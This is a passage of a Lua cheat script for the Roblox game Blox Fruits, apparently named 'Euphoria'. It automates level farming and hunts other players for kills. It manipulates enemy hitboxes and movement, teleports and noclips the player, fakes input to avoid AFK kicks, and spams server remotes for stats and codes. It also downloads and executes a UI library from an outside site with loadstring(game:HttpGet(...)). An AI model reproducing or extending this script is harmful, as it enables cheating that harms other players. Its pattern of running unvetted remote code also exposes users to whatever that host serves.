                        game:service('VirtualInputManager'):SendKeyEvent(false, currSkill, false, game)
                        wait(.5)
                        return true
                    end
                    return false
                end
            end
        end

        function isAbleToKillBounty(enemy)
            if LP.Name == enemy.Name then return false end
            if LP.Team.Name == "Marines" then
                if enemy.Team == LP.Team then return false end
            end
            if enemy.Character:FindFirstChild("TempSafeZone") then return false end
            if enemy.Neutral then return false end
            if enemy.Data.Level.Value < 20 then
                return false
            end
            if LP.Data.Level.Value - enemy.Data.Level.Value > 500 then
                return false
            end
            if enemy.Data.Level.Value - LP.Data.Level.Value > 500 then
                return false
            end
            if enemy.Data.DevilFruit.Value == 'Buddha-Buddha' or enemy.Data.DevilFruit.Value == 'Dough-Dough' or enemy.Data.DevilFruit.Value == 'Kitsune-Kitsune' then
                return false
            end            
            return true
        end

        function isAbleToKill(enemy)
            if enemy.Data.Level.Value < 20 then
                return false
            end
            if enemy.Data.Level.Value > LP.Data.Level.Value + 500 then
                return false
            end
            if enemy.Data.DevilFruit.Value == 'Buddha-Buddha' or enemy.Data.DevilFruit.Value == 'Dough-Dough' or enemy.Data.DevilFruit.Value == 'Kitsune-Kitsune' then
                return false
            end
            if (enemy.Data.Stats.Defense.Level.Value - (LP.Data.Stats.Melee.Level.Value * 4)) - 300 > LP.Data.Stats.Melee.Level.Value * 10 + 400 then
                return false
            end
            
            return true
        end
        skipcount = 0
        -- KAITUN
        -- ============================
        task.spawn(function()
            while task.wait() do
                st, err = pcall(function()
                    local MyLevel = LP.Data.Level.Value
                    local QuestC = LP.PlayerGui.Main.Quest
                    local Quest = QuestCheck()

                    if skipcount > 40 then
                        HopServer()
                    end
                    
                    if _G.AutoFarmLevel then
                        if first_sea then
                            if QuestC.Visible == true then
                                if isPlayerHunterQuest(LP.PlayerGui.Main.Quest) then
                                    target = nil
                                    for i, plr in pairs(Players:GetChildren()) do
                                        if target then break end
                                        if string.find(LP.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, plr.Name) then
                                            target = plr
                                        end
                                    end
                                    if not target then 
                                        skipcount = skipcount + 1
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("AbandonQuest") 
                                    end
                                    if not isAbleToKill(target) then
                                        skipcount = skipcount + 1
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("AbandonQuest") 
                                    end
                                    done = false
                                    repeat task.wait()
                                        if not target.Character:FindFirstChild("HumanoidRootPart") then done = true end
                                        if getDistance(target.Character.HumanoidRootPart.CFrame) > 4000 then
                                            if useNearestEntrance(target.Character.HumanoidRootPart.CFrame) then
                                                StopTween()
                                            end
                                            task.wait(.2)
                                            if getDistance(target.Character.HumanoidRootPart.CFrame) > 10000 then
                                                Bypass(target.Character.HumanoidRootPart.CFrame)
                                            end
                                            if getDistance(target.Character.HumanoidRootPart.CFrame) > 4000 then
                                                repeat task.wait()
                                                    if useNearestEntrance(target.Character.HumanoidRootPart.CFrame) then
                                                        StopTween()
                                                    end
                                                    toTarget(target.Character.HumanoidRootPart.CFrame)
                                                until getDistance(target.Character.HumanoidRootPart.CFrame) < 100 or getDistance(target.Character.HumanoidRootPart.CFrame) > 1500 or not LP.PlayerGui.Main.Quest.Visible
                                                StopTween()
                                            end
                                        end
                                        _G.KillingPlayer = true
                                        if LP.PlayerGui.Main.PvpDisabled.Visible == true then
                                            repeat task.wait() until LP.Character.Humanoid.Health > 0
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("EnablePvp")
                                            toTarget(LP.Character.HumanoidRootPart.CFrame)
                                        end
                                        char = target.Character
                                        
                                        if char then
                                            if char:FindFirstChild("HumanoidRootPart") then
                                                if getDistance(char.HumanoidRootPart.CFrame) <= 50 then
                                                    AttackSkill(target, nil)
                                                end
                                                PosMon = char.HumanoidRootPart.CFrame
                                                BringMobFarm = false
                                                EquipWeapon(_G.SelectWeapon)
                                                char.HumanoidRootPart.Transparency = 1
                                                if useNearestEntrance(char.HumanoidRootPart.CFrame * CFrame.new(2, 1, 0)) then
                                                    StopTween()
                                                end
                                                toTarget(char.HumanoidRootPart.CFrame * CFrame.new(2, 1, 0))
                                            end
                                        end
                                    until not char or not char:FindFirstChild("Parent") or not char:FindFirstChild("Humanoid") or char.Humanoid.Health <= 0 or LP.PlayerGui.Main.Quest.Visible == false or not char:FindFirstChild("HumanoidRootPart") or done == true
                                    _G.KillingPlayer = false
                                    _G.AimbotPos = nil
                                else
                                    if not string.find(LP.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, Quest.QuestNPCName) then
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("AbandonQuest")
                                    end
                                    if not questStarted then
                                        if useNearestEntrance(Quest.QuestGiverPosition) then
                                            StopTween()
                                        end
                                        task.wait(.2)
                                        if getDistance(Quest.QuestGiverPosition) > 10000 then
                                            if not useNearestEntrance(Quest.QuestGiverPosition) then
                                                Bypass(Quest.QuestGiverPosition)
                                            end
                                            task.wait(.2)
                                        end
                                        if getDistance(Quest.QuestGiverPosition) > 4000 then
                                            repeat wait()
                                                if useNearestEntrance(Quest.QuestGiverPosition) then
                                                    StopTween()
                                                end
                                                toTarget(Quest.QuestGiverPosition)
                                            until getDistance(Quest.QuestGiverPosition) < 10 or not _G.AutoFarmLevel
                                        end
                                        
                                    end
                                    if workspace.Enemies:FindFirstChild(Quest.NPCName) then
                                        for i,v in pairs(workspace.Enemies:GetChildren()) do
                                            if v.Name == Quest.NPCName then
                                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                                    repeat task.wait()
                                                        if not string.find(LP.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, Quest.QuestNPCName) then
                                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("AbandonQuest")
                                                        else
                                                            status, err = pcall(function()
                                                                questStarted = true
                                                                PosMon = v.HumanoidRootPart.CFrame
                                                                v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                                v.HumanoidRootPart.CanCollide = false
                                                                v.Humanoid.WalkSpeed = 0
                                                                v.Head.CanCollide = false
                                                                BringMobFarm = true
                                                                PosMon = v.HumanoidRootPart.CFrame
                                                                EquipWeapon(_G.SelectWeapon)
                                                                v.HumanoidRootPart.Transparency = 1
                                                                if useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                                    StopTween()
                                                                end
                                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                            end)
                                                            if err then print(err, '2584') end
                                                        end
                                                    until not v.Parent or not v:FindFirstChild("Humanoid") or v.Humanoid.Health <= 0 or QuestC.Visible == false or not v:FindFirstChild("HumanoidRootPart")
                                                end
                                            end
                                        end
                                    else
                                        if getDistance(Quest.NPCPosition * OffsetCFrame()) > 1000 then
                                            if useNearestEntrance(Quest.NPCPosition * OffsetCFrame()) then
                                                StopTween()
                                            end
                                        end
                                        toTarget(Quest.NPCPosition * OffsetCFrame())
                                        if (Quest.NPCPosition.Position - LP.Character.HumanoidRootPart.Position).Magnitude <= 50 then
                                            wait(0.5)
                                        end
                                    end
                                end
                            else
                                if MyLevel < 10 then
                                    game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer("StartQuest", Quest.QuestName, Quest.QuestLevel)
                                    toTarget(Quest.NPCPosition * OffsetCFrame())
                                end

                                if MyLevel >= 10 then
                                    if MyLevel < 300 then
                                        if MyLevel > 20 then
                                            if string.find(ReplicatedStorage.Remotes.CommF_:InvokeServer("PlayerHunter"), "We heard") then
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("EnablePvp")
                                            else
                                                farmSkyGuards()
                                            end
                                        else
                                            farmSkyGuards()
                                        end
                                    end
                                end

                                if MyLevel < 700 and MyLevel >= 300 then
                                    if MyLevel < 690 then
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("EnablePvp")
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("PlayerHunter")
                                        wait(.5)
                                    end
                                    if LP.PlayerGui.Main.Quest.Visible == false then
                                        if (Quest.QuestGiverPosition.Position - LP.Character.HumanoidRootPart.Position).Magnitude >= 3000 then
                                            questStarted = false
                                            useNearestEntrance(Quest.QuestGiverPosition)
                                            task.wait(.2)
                                            if getDistance(Quest.QuestGiverPosition) > 10000 then
                                                Bypass(Quest.QuestGiverPosition)
                                                task.wait(.2)
                                                if getDistance(Quest.QuestGiverPosition) > 4000 then
                                                    repeat wait()
                                                        toTarget(Quest.QuestGiverPosition)
                                                    until getDistance(Quest.QuestGiverPosition) < 10
                                                end
                                            end
                                        else
                                            repeat wait() toTarget(Quest.QuestGiverPosition) until (Quest.QuestGiverPosition.Position - LP.Character.HumanoidRootPart.Position).Magnitude <= 60
                                        end
                                        repeat wait() toTarget(Quest.QuestGiverPosition) until (Quest.QuestGiverPosition.Position - LP.Character.HumanoidRootPart.Position).Magnitude <= 60
                                        if (Quest.QuestGiverPosition.Position - LP.Character.HumanoidRootPart.Position).Magnitude <= 40 then
                                            BringMobFarm = true
                                            wait(0.2)
                                            game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer("StartQuest", Quest.QuestName, Quest.QuestLevel) wait(0.5)
                                            toTarget(Quest.NPCPosition * OffsetCFrame())
                                        end
                                    end
                                end 
                            end
                        elseif second_sea or third_sea then
                            if second_sea and LP.Data.Level.Value >= 1500 and (not _G.MaxLevel or _G.MaxLevel > 1500) then
                                AutoSea3 = true
                            else
                                if QuestC.Visible == true then
                                    if not questStarted then
                                        useNearestEntrance(Quest.QuestGiverPosition)
                                        task.wait(.2)
                                        if getDistance(Quest.QuestGiverPosition) > 10000 then
                                            if not useNearestEntrance(Quest.QuestGiverPosition) then
                                                Bypass(Quest.QuestGiverPosition)
                                            end
                                            task.wait(.2)
                                            if getDistance(Quest.QuestGiverPosition) > 4000 then
                                                repeat wait()
                                                    if useNearestEntrance(Quest.QuestGiverPosition) then
                                                        StopTween()
                                                    end
                                                    toTarget(Quest.QuestGiverPosition)
                                                until getDistance(Quest.QuestGiverPosition) < 10 or not _G.AutoFarmLevel
                                            end
                                        end
                                    end
                                    if workspace.Enemies:FindFirstChild(Quest.NPCName) then
                                        for i,v in pairs(workspace.Enemies:GetChildren()) do
                                            if v.Name == Quest.NPCName then
                                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                                    repeat task.wait()
                                                        if not string.find(LP.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, Quest.QuestNPCName) then
                                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("AbandonQuest")
                                                        else
                                                            status, err = pcall(function()
                                                                questStarted = true
                                                                PosMon = v.HumanoidRootPart.CFrame
                                                                v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                                v.HumanoidRootPart.CanCollide = false
                                                                v.Humanoid.WalkSpeed = 0
                                                                v.Head.CanCollide = false
                                                                BringMobFarm = true
                                                                PosMon = v.HumanoidRootPart.CFrame
                                                                EquipWeapon(_G.SelectWeapon)
                                                                v.HumanoidRootPart.Transparency = 1
                                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                            end)
                                                            if err then print(err, '2584') end
                                                        end
                                                    until not v.Parent or not v:FindFirstChild("Humanoid") or v.Humanoid.Health <= 0 or QuestC.Visible == false or not v:FindFirstChild("HumanoidRootPart")
                                                end
                                            end
                                        end
                                    else
                                        if getDistance(Quest.NPCPosition * OffsetCFrame()) > 1000 then
                                            if useNearestEntrance(Quest.NPCPosition * OffsetCFrame()) then
                                                StopTween()
                                            end
                                        end
                                        toTarget(Quest.NPCPosition * OffsetCFrame())
                                        if (Quest.NPCPosition.Position - LP.Character.HumanoidRootPart.Position).Magnitude <= 50 then
                                            wait(0.5)
                                        end
                                    end
                                else
                                    if LP.PlayerGui.Main.Quest.Visible == false then
                                        questStarted = false
                                        if (Quest.QuestGiverPosition.Position - LP.Character.HumanoidRootPart.Position).Magnitude >= 3000 then
                                            useNearestEntrance(Quest.QuestGiverPosition)
                                            wait(.2)
                                            if getDistance(Quest.QuestGiverPosition) > 2000 then
                                                Bypass(Quest.QuestGiverPosition)
                                                wait(.2)
                                                if getDistance(Quest.QuestGiverPosition) > 2000 then
                                                    repeat wait()
                                                        tf = toTarget(Quest.QuestGiverPosition)
                                                    until getDistance(Quest.QuestGiverPosition) < 10
                                                end
                                            end
                                        else
                                            repeat wait() toTarget(Quest.QuestGiverPosition) until (Quest.QuestGiverPosition.Position - LP.Character.HumanoidRootPart.Position).Magnitude <= 60
                                        end
                                        if (Quest.QuestGiverPosition.Position - LP.Character.HumanoidRootPart.Position).Magnitude <= 40 then
                                            BringMobFarm = true
                                            wait(0.2)
                                            game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer("StartQuest", Quest.QuestName, Quest.QuestLevel) wait(0.5)
                                            toTarget(Quest.NPCPosition * OffsetCFrame())
                                        end
                                    end
                                end
                            end
                            
                        end
                    end 
                end)
                if err then print(err, 'line 2725') end
            end
        end)

        local function learnNeededStat()
            local plr = LP
            local Melee = plr.Data.Stats.Melee.Level.Value
            local Defense = plr.Data.Stats.Defense.Level.Value
            local Sword = plr.Data.Stats.Sword.Level.Value
            
            if plr.Data.Points.Value == 0 then return end

            if Melee < 2550 then
                local args = {
                    [1] = "AddPoint",
                    [2] = "Melee",
                    [3] = 2550 - Melee
                }
                ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
            elseif Defense < 2550 then
                local args = {
                    [1] = "AddPoint",
                    [2] = "Defense",
                    [3] = 2550 - Defense
                }
                ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
            elseif Sword < 2550 then
                local args = {
                    [1] = "AddPoint",
                    [2] = "Sword",
                    [3] = 2550 - Sword
                }
                ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
            end
        end

        spawn(function()
            while wait() do
                if _G.AutoFarmLevel then
                    learnNeededStat()
                end
            end
        end)

        spawn(function()
            while wait() do
                st, err = pcall(function()
                    if _G.AutoFarmLevel and isItemInEquip("Combat") and LP.Data.Beli.Value >= 150000 then
                        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BuyBlackLeg")
                    end
                    wait(40)
                end)
            end
        end)

        spawn(function()
            while wait() do
                if first_sea then
                    if game.ReplicatedStorage.Remotes.CommF_:InvokeServer("DressrosaQuestProgress", "Dressrosa") == 0 then return end
                    if _G.AutoFarmLevel or _G.DoSecondSea then
                        if LP.Data.Level.Value >= 700 and game.ReplicatedStorage.Remotes.CommF_:InvokeServer("DressrosaQuestProgress", "Dressrosa") ~= 0 then
                            doSecondSea()
                        end
                    end
                end
            end
        end)

        local function redeemcodes()
            local redeem = function(code)
                local args = {
                    [1] = code
                }
                ReplicatedStorage.Remotes.Redeem:InvokeServer(unpack(args))
            end
            redeem("SUB2GAMERROBOT_RESET1")
            redeem("Sub2UncleKizaru")
            redeem("ADMINHACKED")
            local function isExpActive()
                if string.find(game:GetService("Players").LocalPlayer.PlayerGui.Main.Level.Exp.Text, "2x ends") then
                    return true
                else
                    return false
                end
            end
            if not isExpActive() then
                redeem("NOOB2ADMIN")
            end
            wait(1)
            if not isExpActive() then
                redeem("CODESLIDE")
            end
            wait(1)
            if not isExpActive() then
                redeem("Sub2Fer999")
            end
            wait(1)
            if not isExpActive() then
                redeem("Enyu_is_Pro")
            end
            wait(1)
            if not isExpActive() then
                redeem("Magicbus")
            end
            wait(1)
            if not isExpActive() then
                redeem("JCWK")
            end
            wait(1)
            if not isExpActive() then
                redeem("Starcodeheo")
            end
            wait(1)
            if not isExpActive() then
                redeem("Bluxxy")
            end
            wait(1)
            if not isExpActive() then
                redeem("fudd10_v2")
            end
            wait(1)
            if not isExpActive() then
                redeem("THEGREATACE")
            end
            wait(1)
            if not isExpActive() then
                redeem("TantaiGaming")
            end
            wait(1)
            if not isExpActive() then
                redeem("Axiore")
            end
            wait(1)
            if not isExpActive() then
                redeem("Sub2OfficialNoobie")
            end
            wait(1)
            if not isExpActive() then
                redeem("StrawHatMaine")
            end
            wait(1)
            if not isExpActive() then
                redeem("SUB2GAMERROBOT_EXP1")
            end
            wait(1)
        end

        spawn(function()
            while wait() do
                if _G.AutoFarmLevel then
                    if LP.Data.Level.Value >= 10 then
                        redeemcodes()
                        wait(50)
                    end
                end
            end
        end)

        function countNearestEnemies()
            count = 0
            for i,v in pairs(Enemies:GetChildren()) do
                if getDistance(v.HumanoidRootPart.CFrame) < 200 then
                    count = count + 1
                end
            end
            return count
        end
        
        coroutine.wrap(function()
            while task.wait(_G.FastSpeed) do
                pcall(function()
                    local ac = CombatFrameworkR.activeController
                    if ac and ac.equipped then
                        if _G.FastAttack and not _G.DisableFastAttack then
                            status, err = pcall(function() AttackFunction() end)
                        else
                            if ac.hitboxMagnitude ~= 55 then
                                ac.hitboxMagnitude = 55
                            end
                            ac:attack()
                        end
                    end
                end)
            end
        end)()
        

        spawn(function()
            while wait() do
                if not LP.Character:FindFirstChild("HasBuso") then
                    ReplicatedStorage.Remotes.CommF_:InvokeServer("Buso")
                end
            end 
        end)
        
        spawn(function()
            while wait() do
                wait(200)
                if _G.AntiAFK then
                    local VirtualUser=game:GetService('VirtualUser')
                    VirtualUser:CaptureController()
                    VirtualUser:ClickButton2(Vector2.new())
                    game:GetService("VirtualInputManager"):SendMouseButtonEvent(1,1,0,true,nil,0)
                    game:GetService("VirtualInputManager"):SendMouseButtonEvent(1,1,0,false,nil,0) 
                end
            end
        end)
        
        spawn(function()
            while wait() do
                if _G.LearnMelee then
                    local args = {
                        [1] = "AddPoint",
                        [2] = "Melee",
                        [3] = _G.LearnRate
                    }
                    ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
                end
                if _G.LearnDefense then
                    local args = {
                        [1] = "AddPoint",
                        [2] = "Defense",
                        [3] = _G.LearnRate
                    }
                    ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
                end
                if _G.LearnSword then
                    local args = {
                        [1] = "AddPoint",
                        [2] = "Sword",
                        [3] = _G.LearnRate
                    }
                    ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
                end
                if _G.LearnGun then
                    local args = {
                        [1] = "AddPoint",
                        [2] = "Gun",
                        [3] = _G.LearnRate
                    }
                    ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
                end
                if _G.LearnFruit then
                    local args = {
                        [1] = "AddPoint",
                        [2] = "Demon Fruit",
                        [3] = _G.LearnRate
                    }
                    ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
                end
                
            end
        end)
    
        local function getFruitWorth(fruitName)
            worth = {
                ["Quake Fruit"] = 1000000,
                ["Buddha Fruit"] = 1200000,
                ["Love Fruit"] = 1300000,
                ["Spider Fruit"] = 1500000,
                ["Sound Fruit"] = 1700000,
                ["Phoenix Fruit"] = 1800000,
                ["Portal Fruit"] = 1900000,
                ["Rumble Fruit"] = 2100000,
                ["Pain Fruit"] = 2300000,
                ["Blizzard Fruit"] = 2400000,
                ["Gravity Fruit"] = 2500000,
                ["Mammoth Fruit"] = 2700000,
                ["T-Rex Fruit"] = 2700000,
                ["Dough Fruit"] = 2800000,
                ["Shadow Fruit"] = 2900000,
                ["Venom Fruit"] = 3000000,
                ["Control Fruit"] = 3200000,
                ["Spirit Fruit"] = 3400000,
                ["Dragon Fruit"] = 3500000,
                ["Leopard Fruit"] = 5000000,
                ["Kitsune Fruit"] = 8000000,
            }
            return worth[fruitName] or 0
        end
        
        local function isFruitsOnServer() 
            for i,v in pairs(game.Workspace:GetChildren()) do
                if v.Name ~= 'Blox Fruit Dealer' then
                    if string.find(v.Name, 'Fruit') then
                        return true
                    end
                end
            end
            return false
        end
        
        local function findNearestFruit()
            local fruit = nil
            local dis = math.huge
            for i,v in pairs(game.Workspace:GetChildren()) do
                if v.Name ~= 'Blox Fruit Dealer' then
                    if string.find(v.Name, ' Fruit') or v:FindFirstChild("Fruit") then
                        if getDistance(v:GetPivot()) < dis then
                            fruit = v
                            dis = getDistance(v:GetPivot())
                        end
                    end
                end
            end
            return fruit
        end

        local function takeFruits()
            for i,v in pairs(game.Workspace:GetChildren()) do
                touched = false
                if v.Name ~= 'Blox Fruit Dealer' then
                    if string.find(v.Name, ' Fruit') or v:FindFirstChild("Fruit") then
                        repeat wait()
                            LP.Character.HumanoidRootPart.CFrame = v.Handle.CFrame
                            -- if v.Handle:FindFirstChild("TouchInterest") and not touched then
                            --     touched = true
                            --     firetouchinterest(LP.Character.HumanoidRootPart, v.Handle.TouchInterest, 0) 
                            -- end
                            game:service('VirtualInputManager'):SendKeyEvent(true, "W", false, game)
                            game:service('VirtualInputManager'):SendKeyEvent(false, "W", false, game)
                            game:service('VirtualInputManager'):SendKeyEvent(true, "A", false, game)
                            game:service('VirtualInputManager'):SendKeyEvent(false, "A", false, game)
                        until not v or not v.Parent or v.Parent.Name ~= 'Workspace'
                    end
                end
            end
        end
        
        local function storeFruit(fruitName, fruitRealName) 
            repeat wait()
                if LP.Character:FindFirstChild(fruitName) then
                    local args = {
                        [1] = "StoreFruit",
                        [2] = fruitRealName,
                        [3] = LP.Character:FindFirstChild(fruitName)
                    }
                    ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
                elseif LP.Backpack:FindFirstChild(fruitName) then
                    local args = {
                        [1] = "StoreFruit",
                        [2] = fruitRealName,
                        [3] = LP.Backpack:FindFirstChild(fruitName)
                    }
                    ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
                else return end
            until not isItemInEquip(fruitName)
        end
        
        function isFruitInBackpack(OriginalName)
            for i,v in pairs(ReplicatedStorage.Remotes["CommF_"]:InvokeServer("getInventoryFruits")) do
                if OriginalName == v.Name then return true end
            end
            return false
        end

        local function storeAllWorthFruits()
            for i,v in pairs(LP.Backpack:GetChildren()) do 
                if string.find(v.Name, ' Fruit') and not isFruitInBackpack(v:GetAttribute("OriginalName")) then
                    if getFruitWorth(v.Name) >= 1000000 then
                        print("Storing", v.Name)
                        pcall(function() storeFruit(v.Name, v:GetAttribute("OriginalName")) end)
                    end
                end
            end
            for i,v in pairs(LP.Character:GetChildren()) do 
                if string.find(v.Name, ' Fruit') and not isFruitInBackpack(v:GetAttribute("OriginalName")) then
                    if getFruitWorth(v.Name) >= 1000000 then
                        print("Storing", v.Name)
                        pcall(function() storeFruit(v.Name, v:GetAttribute("OriginalName")) end)
                    end
                end
            end
            return true
        end

        local function storeAllFruits()
            for i,v in pairs(LP.Backpack:GetChildren()) do 
                if string.find(v.Name, ' Fruit') and not isFruitInBackpack(v:GetAttribute("OriginalName")) then
                    print("Storing", v.Name)
                    pcall(function() storeFruit(v.Name, v:GetAttribute("OriginalName")) end)
                end
            end
            for i,v in pairs(LP.Character:GetChildren()) do 
                if string.find(v.Name, ' Fruit') and not isFruitInBackpack(v:GetAttribute("OriginalName")) then
                    print("Storing", v.Name)
                    LP.Character.Humanoid:EquipTool(v)
                    pcall(function() storeFruit(v.Name, v:GetAttribute("OriginalName")) end)
                end
            end
        end
        
        local function isCheapFruitsInInventory()
            for i,v in pairs(LP.Backpack:GetChildren()) do 
                if string.find(v.Name, ' Fruit') then
                    if getFruitWorth(v.Name) < 1000000 then 
                        return true 
                    end
                end
            end
            for i,v in pairs(LP.Character:GetChildren()) do 
                if string.find(v.Name, ' Fruit') then
                    if getFruitWorth(v.Name) < 1000000 then
                        return true 
                    end
                end
            end
            for i,v in pairs(ReplicatedStorage.Remotes["CommF_"]:InvokeServer("getInventoryFruits")) do
                if string.find(v.Name,"T-Rex") then
                    if getFruitWorth("T-Rex Fruit") < 1000000 then
                        return true
                    end
                else
                    if getFruitWorth(string.split(v.Name, '-')[1] .. " Fruit") < 1000000 then
                        return true 
                    end
                end
            end
            return false
        end

        local function isChipInInventory()
            for i,v in pairs(LP.Backpack:GetChildren()) do 
                if string.find(v.Name, 'Microchip') then
                    return true
                end
            end
            for i,v in pairs(LP.Character:GetChildren()) do 
                if string.find(v.Name, 'Microchip') then
                    return true
                end
            end
        end

        local function isRaiding()
            if LP:GetAttribute("IslandRaiding") then
                return true
            else
                return false
            end
        end

        local function isWorthFruitInInventory()
            for i,v in pairs(LP.Backpack:GetChildren()) do 
                if string.find(v.Name, ' Fruit') then
                    if getFruitWorth(v.Name) >= 1000000 then return true end
                end
            end
            for i,v in pairs(LP.Character:GetChildren()) do 
                if string.find(v.Name, ' Fruit') then
                    if getFruitWorth(v.Name) >= 1000000 then return true end
                end
            end
            return false
        end
        
        
        local function isFruitsInInventory()
            for i,v in pairs(LP.Backpack:GetChildren()) do 
                if string.find(v.Name, ' Fruit') then
                    return true
                end
            end
            for i,v in pairs(LP.Character:GetChildren()) do 
                if string.find(v.Name, ' Fruit') then
                    return true
                end
            end
            return false
        end
        
        function UnEquip()
            if LP.Character:FindFirstChildOfClass("Tool") then
                LP.Character:FindFirstChildOfClass("Tool").Parent = LP.Backpack
                return
            end
            for i,v in pairs(LP.Character:GetChildren()) do
                if v:FindFirstChild("firing") then 
                    LP.Character:FindFirstChild(v.Name).Parent = LP.Backpack
                end
            end
        end

        local libUrl = "https://deadcxde.xyz/scripts/lib/loadui.lua"
        local Library = loadstring(game:HttpGet(libUrl))()
        local Window = Library.CreateLib("Euphoria :)", "DarkTheme")
        
        spawn(function()
            while wait() do
                pcall(function()
                    if AutoTweenToTeammateCell or AutoFindSwordDealer or AutoSea3 or FarmLibraryKey or FarmWaterKey or _G.FarmBosses or _G.FarmGunMastery or FollowPlayerBoat or (AutoFindFrozenDimension and not isOnBoat()) or (AutoFindKitsuneIsland and not isOnBoat()) or (_G.AutoGearBoat and not isOnBoat()) or _G.AutoCyborgRaceSelf or _G.FarmDemonicWisp or _G.AutoCyborgRaceTeammate or _G.AutoGodhuman or (_G.AutoSharkAnchor and not isOnBoat()) or _G.AutoSoulReaper or (AutoSeaBeast and not isOnBoat()) or (AutoSeaBeastRaceV3 and not isOnBoat()) or _G.AutoFarmFruitsSafe or (AutoV3Race and not AutoSeaBeastRaceV3) or _G.FarmFangs or _G.FarmWeaponMastery or _G.FarmFruitMastery or _G.FarmBounty or _G.AutoV2Race or _G.KillingOrder or _G.KillIndra or _G.FarmDragonScale or _G.AutoPole1st or _G.FarmCocoa or _G.AutoCanvander or _G.AutoFarmLevel or _G.KillPlayer or _G.AutoFarmLevel or _G.AutoGear or _G.KillDough or AutoBartilo or _G.AutoSoulGuitar or _G.FarmDough or AutoCDK or _G.TweenToMirage or _G.TweenToGear or _G.DoSecondSea or FarmBones or FarmBonesCDK or _G.AutoHolyTorch or AutoYama or AutoTushita or FarmEctoplasm or getgenv().EuphoriaSettings["Auto Rengoku"] or getgenv().EuphoriaSettings["Swan Glasses"] or getgenv().EuphoriaSettings["Gravity Cane"] or getgenv().EuphoriaSettings["Auto Kill Darkbeard"] or getgenv().EuphoriaSettings["Auto Factory"] or getgenv().EuphoriaSettings["Auto Ghoul Race"] or _G.TweenToIsland or _G.TweenToNPC then 
                        NoClip = true 
                    else
                        NoClip = false 
                    end
                end)
            end
        end)

        local MainTab = Window:NewTab("Main")
        local InfoSection = MainTab:NewSection("Information")
        local MainFarmSection = MainTab:NewSection("Farm settings")
        timerLabel = InfoSection:NewLabel(" ")
        task.spawn(function()
            while task.wait(4) do
                pcall(function()
                    h=math.floor((math.floor(workspace.DistributedGameTime+0.5)/(60*60*1))%(24))
                    m=math.floor(math.floor(workspace.DistributedGameTime+0.5)/(60*1))%(60)
                    s=math.floor(math.floor(workspace.DistributedGameTime+0.5)/(1))%(60)
                    h=(string.len(h)==1 and "0"..h or h)
                    m=(string.len(m)==1 and "0"..m or m)
                    s=(string.len(s)==1 and "0"..s or s)
                    timerLabel:UpdateLabel("Online Time: "..h..":"..m..":"..s)
                end)
            end
        end)
        gameTime = InfoSection:NewLabel(" ")
        task.spawn(function()
            while task.wait(4) do
                pcall(function()
                    gameTime:UpdateLabel("Game Time: " .. game:GetService("Lighting").TimeOfDay)
                end)
            end
        end)
        currentMoon = InfoSection:NewLabel(" ")
        spawn(function()
            while wait() do
                pcall(function()
                    currentMoon:UpdateLabel("Moon Status: " .. getMoonPhase())
                end)
                wait(20)
            end
        end)
        InfoSection:NewLabel(" ")
        currentBounty = InfoSection:NewLabel("Bounty: ")
        spawn(function()
            while wait(2) do
                pcall(function()
                    currentBounty:UpdateLabel("Bounty: " .. tostring(LP.leaderstats["Bounty/Honor"].Value))
                end)
            end
        end)
        currentBeli = InfoSection:NewLabel("Beli: ")
        spawn(function()
            while wait(5) do
                pcall(function()
                    currentBeli:UpdateLabel("Beli: " .. tostring(LP.Data.Beli.Value))
                end)
            end
        end)
        currentFrag = InfoSection:NewLabel("Fragments: ")
        spawn(function()
            while wait(5) do
                pcall(function()
                    currentFrag:UpdateLabel("Fragments: " .. tostring(LP.Data.Fragments.Value))
                end)
            end
        end)

        InfoSection:NewLabel("")
        MainFarmSection:NewSlider("Atk Speed Delay", 0, 300, function(count)
            _G.FastSpeed = count / 100
        end)
        spawn(function()
            while wait(1) do
                pcall(function()
                    if _G.FastSpeed then
                        getgenv().EuphoriaSettings['Fast Speed'] = _G.FastSpeed
                        WriteSettings()
                    end
                end)
            end
        end)

        _G.FastSpeed = getgenv().EuphoriaSettings['Fast Speed'] or 0.2

        autoFarmLevel = MainFarmSection:NewToggle("Auto Farm Level", function(state)
            _G.AutoFarmLevel = state
            getgenv().EuphoriaSettings['Auto Farm Level'] = state
            WriteSettings()
        end)
        if _G.AutoFarmLevel or getgenv().EuphoriaSettings['Auto Farm Level'] then autoFarmLevel:UpdateToggle(nil, true) end
        
        MaxLevelDropdown = MainFarmSection:NewDropdown("Max Level", {"0", "700", "1500", "2550"}, function(choice)
            getgenv().EuphoriaSettings['Max Level'] = tonumber(choice)
            WriteSettings()
        end)
